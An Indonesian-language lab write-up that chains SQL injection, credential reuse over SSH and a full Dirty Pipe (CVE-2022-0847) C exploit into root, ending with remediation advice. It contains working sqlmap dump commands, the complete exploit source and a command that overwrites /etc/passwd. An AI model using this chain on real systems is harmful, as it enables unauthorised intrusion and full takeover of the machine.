# 03 — Write-Up Lab Gazette
## SQL Injection → Credential Disclosure → SSH Foothold → Dirty Pipe → Root

> **Ruang lingkup:** hanya untuk laboratorium, CTF, atau pengujian yang telah memperoleh izin tertulis.  
> **Catatan penting:** tahap Dirty Pipe mengubah `/etc/passwd`. Gunakan snapshot VM dan reset lingkungan setelah praktik.

---

## Daftar Isi

1. Ringkasan eksekutif  
2. Data penting lab  
3. Rantai serangan  
4. Reconnaissance  
5. Identifikasi dan validasi SQL Injection  
6. Enumerasi database dengan SQLMap  
7. SSH foothold sebagai `editor`  
8. Enumerasi privilege escalation  
9. Menyiapkan PoC Dirty Pipe  
10. Menghitung offset UID  
11. Eksploitasi dan validasi root  
12. Pencarian flag  
13. Bukti yang perlu didokumentasikan  
14. Analisis temuan dan rekomendasi  
15. Troubleshooting  
16. Versi close book  
17. Cheat sheet singkat  
18. Pemulihan lab

---

# 1. Ringkasan Eksekutif

Aplikasi Gazette pada port `8000` memiliki kerentanan **SQL Injection** pada parameter GET `id` di endpoint `/news/detail`. Kerentanan tersebut memungkinkan enumerasi database dan pengambilan kredensial akun `editor`.

Kredensial yang diperoleh dapat digunakan kembali untuk login melalui SSH. Setelah memperoleh shell lokal sebagai `editor`, ditemukan kernel lab yang rentan terhadap **Dirty Pipe (CVE-2022-0847)**. PoC digunakan untuk menimpa UID akun `editor` pada `/etc/passwd` dari `1001` menjadi `0000`. Setelah membuka sesi baru dengan `su - editor`, akun tersebut berjalan dengan UID `0` dan memperoleh hak root.

```text
SQL Injection
→ dump credential editor
→ SSH credential reuse
→ local enumeration
→ Dirty Pipe
→ ubah UID editor menjadi 0
→ root
→ cari dan baca flag
```

---

# 2. Data Penting Lab

| Item | Nilai |
|---|---|
| Target | `192.168.56.121` |
| Web | `http://192.168.56.121:8000` |
| SSH | `192.168.56.121:22` |
| Endpoint rentan | `/news/detail?id=1` |
| Parameter rentan | `id` |
| DBMS | MySQL/MariaDB |
| Database aplikasi | `gazette` |
| Tabel kredensial | `users` |
| Kredensial | `editor:password123` |
| User foothold | `editor` |
| UID awal | `1001` |
| Kernel hint lab | `Linux 5.10.70-1` |
| Privilege escalation | Dirty Pipe / CVE-2022-0847 |
| File target | `/etc/passwd` |
| Binary exploit | `/home/editor/dirtypipe` |
| Pencarian flag | `find / -type f -iname "*flag*" 2>/dev/null` |

---

# 3. Rantai Serangan

```text
1. Nmap menemukan port 22 dan 8000
2. Endpoint /news/detail?id=1 menerima input parameter id
3. SQLMap membuktikan UNION-based SQL Injection
4. Enumerasi database menemukan database gazette
5. Enumerasi tabel menemukan tabel users
6. Dump tabel users memperoleh editor:password123
7. Credential digunakan untuk SSH
8. Kernel dan privilege lokal diperiksa
9. PoC Dirty Pipe dikompilasi
10. Offset UID editor pada /etc/passwd dihitung
11. UID 1001 ditimpa menjadi 0000
12. su - editor membuka sesi dengan UID 0
13. Flag user dan root dicari
```

---

# 4. Reconnaissance

## 4.1 Menentukan Target

```bash
TARGET="192.168.56.121"
WEB="http://192.168.56.121:8000"
URL="$WEB/news/detail?id=1"
```

## 4.2 Memindai Port dan Service

```bash
nmap -Pn -sC -sV -p22,8000 "$TARGET"
```

### Evidence yang Diharapkan

```text
22/tcp   open  ssh
8000/tcp open  http
```

### Interpretasi

- Port `8000` adalah permukaan serangan aplikasi web.
- Port `22` menjadi kandidat jalur foothold apabila ditemukan kredensial.
- Jangan langsung mencoba kredensial acak; lakukan pengujian hanya dalam scope lab.

## 4.3 Mengakses Endpoint Berparameter

```bash
curl -i "$URL"
```

Contoh endpoint:

```text
http://192.168.56.121:8000/news/detail?id=1
```

Parameter yang diuji:

```text
id
```

---

# 5. Identifikasi dan Validasi SQL Injection

## 5.1 Baseline Response

```bash
curl -sS -D normal.headers -o normal.html "$URL"
wc -c normal.html
```

Baseline diperlukan agar perubahan respons dapat dibandingkan secara objektif.

## 5.2 Uji Boolean Manual

Gunakan URL encoding agar spasi dan karakter khusus dikirim dengan benar:

```bash
curl -sG   --data-urlencode "id=1 AND 1=1"   "$WEB/news/detail"   -o true.html

curl -sG   --data-urlencode "id=1 AND 1=2"   "$WEB/news/detail"   -o false.html

wc -c true.html false.html
diff -u false.html true.html | head -n 40
```

### Interpretasi

Perbedaan konsisten antara kondisi benar dan salah menjadi indikasi bahwa input memengaruhi query. Indikasi manual tetap perlu dikonfirmasi menggunakan tool dan validasi hasil.

## 5.3 Deteksi dengan SQLMap

```bash
sqlmap   -u "$URL"   -p id   --batch   --technique=U
```

### Evidence yang Diharapkan

```text
Parameter: id (GET)
Type: UNION query
DBMS: MySQL/MariaDB
```

### Makna

Parameter `id` dapat mengubah struktur query SQL. Tahap berikutnya adalah enumerasi secara bertahap agar asal nama database, tabel, dan kolom dapat dijelaskan.

---

# 6. Enumerasi Database dengan SQLMap

## 6.1 Menampilkan Database

```bash
sqlmap   -u "$URL"   -p id   --batch   --dbs
```

### Evidence

```text
available databases
[*] gazette
[*] information_schema
```

Nama `gazette` diperoleh dari hasil enumerasi, bukan diasumsikan sejak awal.

## 6.2 Menampilkan Tabel pada Database `gazette`

```bash
sqlmap   -u "$URL"   -p id   --batch   -D gazette   --tables
```

### Evidence

```text
Database: gazette
+-------+
| users |
+-------+
```

## 6.3 Menampilkan Kolom pada Tabel `users`

```bash
sqlmap   -u "$URL"   -p id   --batch   -D gazette   -T users   --columns
```

### Evidence

```text
username
password
```

## 6.4 Dump Kredensial

```bash
sqlmap   -u "$URL"   -p id   --batch   -D gazette   -T users   --dump
```

### Evidence Lab

```text
Username : editor
Password : password123
```

### Kesimpulan Tahap SQLi

Kerentanan SQL Injection memungkinkan pembacaan data sensitif dari database, termasuk kredensial yang selanjutnya dapat digunakan untuk mengakses service lain.

---

# 7. SSH Foothold sebagai `editor`

## 7.1 Login SSH

```bash
ssh editor@192.168.56.121
```

Password:

```text
password123
```

## 7.2 Validasi Konteks User

```bash
id
whoami
hostname
pwd
```

### Evidence

```text
uid=1001(editor) gid=1001(editor)
editor
/home/editor
```

### Makna

- Credential dari aplikasi berlaku pada service SSH.
- Terjadi **credential reuse** antar-komponen.
- Dirty Pipe adalah local privilege escalation, sehingga shell lokal ini menjadi prasyarat.

---

# 8. Enumerasi Privilege Escalation

## 8.1 Periksa Hak Sudo

```bash
sudo -l
```

Apabila tidak tersedia jalur sudo, lanjutkan enumerasi sistem.

## 8.2 Periksa Kernel

```bash
uname -a
cat /proc/version
```

### Evidence Lab

```text
Linux 5.10.70-1
```

## 8.3 Pemeriksaan Tambahan

```bash
id
groups
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
ls -lah /etc/cron.d /etc/cron.daily 2>/dev/null
```

Tujuan enumerasi adalah memilih jalur paling relevan berdasarkan kondisi aktual, bukan langsung mengeksekusi exploit kernel tanpa verifikasi.

---

# 9. Menyiapkan PoC Dirty Pipe

## 9.1 Membuat Source Code

```bash
cd /home/editor

cat > dirtypipe.c <<'EOF'
/* SPDX-License-Identifier: GPL-2.0 */
/*
 * Adapted from the Dirty Pipe CVE-2022-0847 proof of concept.
 * Original author: Max Kellermann <max.kellermann@ionos.com>
 * Copyright 2022 CM4all GmbH / IONOS SE
 *
 * Modified for an authorized security lab.
 */

#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

static void die(const char *message)
{
    perror(message);
    exit(EXIT_FAILURE);
}

static void prepare_pipe(int pipe_fd[2])
{
    if (pipe(pipe_fd) != 0) {
        die("pipe");
    }

    const unsigned int pipe_size =
        (unsigned int)fcntl(pipe_fd[1], F_GETPIPE_SZ);

    static char buffer[4096];

    for (unsigned int remaining = pipe_size; remaining > 0;) {
        unsigned int size =
            remaining > sizeof(buffer) ? sizeof(buffer) : remaining;

        if (write(pipe_fd[1], buffer, size) != (ssize_t)size) {
            die("write pipe");
        }

        remaining -= size;
    }

    for (unsigned int remaining = pipe_size; remaining > 0;) {
        unsigned int size =
            remaining > sizeof(buffer) ? sizeof(buffer) : remaining;

        if (read(pipe_fd[0], buffer, size) != (ssize_t)size) {
            die("read pipe");
        }

        remaining -= size;
    }
}

int main(int argc, char **argv)
{
    if (argc != 4) {
        fprintf(
            stderr,
            "Usage: %s TARGET_FILE OFFSET DATA\n",
            argv[0]
        );
        return EXIT_FAILURE;
    }

    const char *target_path = argv[1];
    loff_t offset = strtoll(argv[2], NULL, 0);
    const char *data = argv[3];
    size_t data_size = strlen(data);

    if (offset <= 0) {
        fprintf(stderr, "Offset harus lebih besar dari 0\n");
        return EXIT_FAILURE;
    }

    if ((offset % 4096) == 0) {
        fprintf(
            stderr,
            "Offset tidak boleh tepat di batas halaman\n"
        );
        return EXIT_FAILURE;
    }

    loff_t next_page = (offset | 4095) + 1;

    if (offset + (loff_t)data_size > next_page) {
        fprintf(
            stderr,
            "Data melewati batas halaman 4096 byte\n"
        );
        return EXIT_FAILURE;
    }

    int target_fd = open(target_path, O_RDONLY);

    if (target_fd < 0) {
        die("open");
    }

    struct stat target_stat;

    if (fstat(target_fd, &target_stat) != 0) {
        die("fstat");
    }

    if (offset + (loff_t)data_size > target_stat.st_size) {
        fprintf(stderr, "Data melewati ukuran file\n");
        return EXIT_FAILURE;
    }

    int pipe_fd[2];
    prepare_pipe(pipe_fd);

    loff_t splice_offset = offset - 1;

    if (
        splice(
            target_fd,
            &splice_offset,
            pipe_fd[1],
            NULL,
            1,
            0
        ) != 1
    ) {
        die("splice");
    }

    ssize_t written = write(pipe_fd[1], data, data_size);

    if (written < 0) {
        die("write");
    }

    if ((size_t)written != data_size) {
        fprintf(
            stderr,
            "Short write: %zd dari %zu byte\n",
            written,
            data_size
        );
        return EXIT_FAILURE;
    }

    printf(
        "Berhasil menulis %zu byte pada offset %lld\n",
        data_size,
        (long long)offset
    );

    close(target_fd);
    close(pipe_fd[0]);
    close(pipe_fd[1]);

    return EXIT_SUCCESS;
}
EOF
```

## 9.2 Compile

```bash
gcc -O2 -Wall dirtypipe.c -o dirtypipe
```

## 9.3 Validasi Binary

```bash
ls -lah dirtypipe
file dirtypipe
```

### Evidence yang Diharapkan

```text
-rwxr-xr-x 1 editor editor ... dirtypipe
dirtypipe: ELF 64-bit LSB executable
```

---

# 10. Menghitung Offset UID

## 10.1 Temukan Posisi Baris `editor`

```bash
grep -bo 'editor:x:1001:1001' /etc/passwd
```

### Contoh Hasil Lab

```text
2183:editor:x:1001:1001
```

Angka `2183` adalah offset awal string `editor:x:1001:1001`.

## 10.2 Hitung Posisi UID

```text
editor:x:1001:1001
         ^
```

Panjang prefix:

```text
editor:x:
```

adalah `9` byte.

Rumus:

```text
offset UID = offset hasil grep + 9
```

Contoh:

```text
2183 + 9 = 2192
```

## 10.3 Validasi Offset Secara Otomatis

Agar tidak bergantung pada angka hafalan:

```bash
BASE_OFFSET=$(grep -bo 'editor:x:1001:1001' /etc/passwd | head -n1 | cut -d: -f1)
UID_OFFSET=$((BASE_OFFSET + 9))

echo "Base offset : $BASE_OFFSET"
echo "UID offset  : $UID_OFFSET"
```

### Catatan Penting

Jangan menghafal `2192` sebagai nilai universal. Isi `/etc/passwd` dapat berbeda sehingga offset harus dihitung ulang pada setiap target.

---

# 11. Eksploitasi dan Validasi Root

## 11.1 Cadangkan `/etc/passwd` untuk Pemulihan Lab

```bash
cp /etc/passwd /home/editor/passwd.before-dirtypipe
ls -l /home/editor/passwd.before-dirtypipe
```

Salinan ini belum dapat ditulis kembali ke `/etc/passwd` sebagai user biasa, tetapi dapat digunakan setelah memperoleh root atau saat pemulihan snapshot.

## 11.2 Timpa UID `1001` Menjadi `0000`

```bash
./dirtypipe /etc/passwd "$UID_OFFSET" 0000
```

Atau dengan offset contoh lab:

```bash
./dirtypipe /etc/passwd 2192 0000
```

### Evidence

```text
Berhasil menulis 4 byte pada offset 2192
```

## 11.3 Verifikasi Perubahan

```bash
grep '^editor:' /etc/passwd
```

### Expected

```text
editor:x:0000:1001::/home/editor:/bin/bash
```

### Mengapa Menggunakan `0000`?

Nilai awal `1001` memiliki panjang empat karakter. Pengganti dibuat sepanjang empat karakter agar struktur file tidak bergeser.

## 11.4 Buka Sesi Baru

```bash
su - editor
```

Password:

```text
password123
```

## 11.5 Validasi Root

```bash
whoami
id
```

### Expected

```text
root
uid=0(root) gid=1001(editor)
```

`whoami` membaca identitas berdasarkan UID efektif. Karena akun `editor` kini memiliki UID `0`, sesi tersebut dikenali sebagai root.

---

# 12. Pencarian Flag

## 12.1 Cari Semua File yang Mengandung Nama Flag

```bash
find / -type f -iname "*flag*" 2>/dev/null
```

### Hasil Lab

```text
/home/editor/FLAG.txt
/root/FLAG.txt
```

## 12.2 Baca User Flag

```bash
cat /home/editor/FLAG.txt
```

Evidence lab:

```text
FLAG{5ql1_l34k5_7h3_n3w5r00m_cr3d5}
```

## 12.3 Baca Root Flag

```bash
cat /root/FLAG.txt
```

Evidence lab:

```text
FLAG{d1r7yp1p3_5pl1c35_7h3_r007}
```

---

# 13. Bukti yang Perlu Didokumentasikan

| Tahap | Evidence minimum |
|---|---|
| Recon | Port `22` dan `8000` terbuka |
| SQLi | Parameter `id`, teknik injection, dan DBMS |
| Database | Database `gazette` ditemukan |
| Tabel | Tabel `users` ditemukan |
| Credential | `editor:password123` |
| Foothold | Output `id`, `whoami`, dan `hostname` melalui SSH |
| Kernel | Output `uname -a` atau `/proc/version` |
| PoC | Binary `dirtypipe` berhasil dikompilasi |
| Offset | Output `grep -bo` dan hasil perhitungan |
| Perubahan UID | Baris `editor:x:0000:...` |
| Root | `whoami` dan `id` menunjukkan UID `0` |
| Objective | Path dan isi flag sesuai scope lab |

Simpan output command, screenshot yang relevan, waktu pengujian, dan konteks user saat evidence diperoleh.

---

# 14. Analisis Temuan dan Rekomendasi

## 14.1 Temuan 1 — SQL Injection pada Parameter `id`

**Lokasi**

```text
GET /news/detail?id=1
Parameter: id
```

**Akar masalah**

Input pengguna dimasukkan ke query SQL tanpa parameterized query yang aman.

**Dampak**

- Enumerasi struktur database.
- Pembacaan data sensitif.
- Pengungkapan kredensial.
- Potensi manipulasi atau penghapusan data, bergantung hak akun database.

**Rekomendasi**

- Gunakan prepared statement atau parameterized query.
- Terapkan allowlist untuk parameter numerik.
- Gunakan akun database dengan prinsip least privilege.
- Jangan tampilkan error database kepada pengguna.
- Tambahkan pengujian SAST, DAST, dan unit test keamanan pada SDLC.

## 14.2 Temuan 2 — Penyimpanan dan Penggunaan Ulang Kredensial

**Akar masalah**

Kredensial yang tersimpan pada aplikasi dapat digunakan untuk SSH.

**Dampak**

Kebocoran satu kredensial aplikasi berubah menjadi akses sistem operasi.

**Rekomendasi**

- Simpan password menggunakan algoritma hashing adaptif yang kuat.
- Pisahkan akun aplikasi dan akun sistem operasi.
- Larang credential reuse.
- Batasi SSH menggunakan allowlist jaringan dan key-based authentication.
- Terapkan MFA pada akses administratif bila memungkinkan.
- Rotasi kredensial setelah indikasi compromise.

## 14.3 Temuan 3 — Kernel Rentan terhadap Local Privilege Escalation

**Akar masalah**

Kernel lab belum menerima patch keamanan yang relevan.

**Dampak**

User lokal dengan privilege rendah dapat memodifikasi file read-only melalui page cache dan meningkatkan hak menjadi root.

**Rekomendasi**

- Terapkan patch kernel dari vendor.
- Gunakan proses patch management dan vulnerability management terjadwal.
- Pantau aset yang menjalankan kernel usang.
- Terapkan hardening dan pembatasan akses shell.
- Deteksi perubahan tidak sah pada file kritis seperti `/etc/passwd`.
- Gunakan EDR/FIM untuk mendeteksi aktivitas privilege escalation.

## 14.4 Attack Chain

```text
SQL Injection
+ credential disclosure
+ credential reuse
+ unpatched kernel
= full system compromise
```

Temuan harus dinilai tidak hanya secara individual, tetapi juga berdasarkan dampak chaining.

---

# 15. Troubleshooting

| Masalah | Kemungkinan penyebab | Solusi |
|---|---|---|
| SQLMap tidak mendeteksi injection | URL, parameter, atau teknik tidak tepat | Pastikan `-p id`, cek baseline manual, coba tanpa membatasi `--technique` |
| Langsung memakai `-D gazette` tanpa bukti | Tahap enumerasi dilewati | Jalankan `--dbs` terlebih dahulu |
| Tabel tidak ditemukan | Database salah atau hak DB terbatas | Verifikasi output `--dbs`, ulang `--tables` |
| SSH gagal | Password salah, service mati, atau kebijakan login | Cek `nmap -p22`, verifikasi credential, gunakan verbose `ssh -vvv` |
| `gcc` tidak tersedia | Compiler tidak terpasang | Compile pada mesin kompatibel lalu transfer binary dalam lab |
| Dirty Pipe gagal menulis | Kernel tidak rentan, offset salah, atau data melewati page boundary | Verifikasi kernel, hitung ulang offset, baca pesan error PoC |
| `/etc/passwd` tidak berubah | Offset atau target string salah | Ulang `grep -bo`, jangan gunakan angka hafalan |
| `su - editor` tetap bukan root | Sesi lama belum membaca perubahan atau UID belum menjadi `0000` | Cek `grep '^editor:' /etc/passwd`, buka sesi baru |
| Sistem login bermasalah | `/etc/passwd` rusak | Pulihkan snapshot atau salinan sebelum exploit |

---

# 16. Versi Close Book

## 16.1 Recon dan Dump Credential

```bash
TARGET="192.168.56.121"
URL="http://192.168.56.121:8000/news/detail?id=1"

nmap -Pn -sC -sV -p22,8000 "$TARGET"

sqlmap -u "$URL" -p id --batch --dbs
sqlmap -u "$URL" -p id --batch -D gazette --tables
sqlmap -u "$URL" -p id --batch -D gazette -T users --columns
sqlmap -u "$URL" -p id --batch -D gazette -T users --dump
```

Expected credential:

```text
editor:password123
```

## 16.2 SSH dan Compile

```bash
ssh editor@192.168.56.121
# password123

cd /home/editor
gcc -O2 -Wall dirtypipe.c -o dirtypipe
```

## 16.3 Hitung Offset

```bash
BASE_OFFSET=$(grep -bo 'editor:x:1001:1001' /etc/passwd | head -n1 | cut -d: -f1)
UID_OFFSET=$((BASE_OFFSET + 9))
echo "$UID_OFFSET"
```

## 16.4 Privilege Escalation

```bash
./dirtypipe /etc/passwd "$UID_OFFSET" 0000
grep '^editor:' /etc/passwd

su - editor
# password123

whoami
id
```

## 16.5 Cari Flag

```bash
find / -type f -iname "*flag*" 2>/dev/null
cat /home/editor/FLAG.txt
cat /root/FLAG.txt
```

---

# 17. Cheat Sheet Singkat

```bash
URL="http://192.168.56.121:8000/news/detail?id=1"

sqlmap -u "$URL" -p id --batch -D gazette -T users --dump

ssh editor@192.168.56.121
# password123

cd /home/editor
gcc -O2 -Wall dirtypipe.c -o dirtypipe

BASE=$(grep -bo 'editor:x:1001:1001' /etc/passwd | head -n1 | cut -d: -f1)
OFFSET=$((BASE + 9))

./dirtypipe /etc/passwd "$OFFSET" 0000
su - editor
# password123

whoami
id
find / -type f -iname "*flag*" 2>/dev/null
cat /root/FLAG.txt
```

### Hafalan Utama

```text
Nmap 22,8000
→ SQLi id
→ --dbs
→ --tables
→ --columns
→ --dump
→ SSH editor
→ compile Dirty Pipe
→ grep -bo
→ offset + 9
→ timpa 1001 menjadi 0000
→ su - editor
→ root
→ find flag
```

---

# 18. Pemulihan Lab

Metode yang paling aman adalah **mengembalikan snapshot VM**.

Apabila snapshot tidak tersedia dan salinan `/etc/passwd` telah dibuat:

```bash
# Jalankan sebagai root setelah pengujian
cp /home/editor/passwd.before-dirtypipe /etc/passwd
chown root:root /etc/passwd
chmod 644 /etc/passwd
grep '^editor:' /etc/passwd
```

Pastikan akun kembali memiliki UID awal:

```text
editor:x:1001:1001:...
```

Setelah itu, tutup sesi dan validasi login normal. Jangan melakukan pemulihan manual pada sistem produksi tanpa prosedur perubahan dan backup resmi.
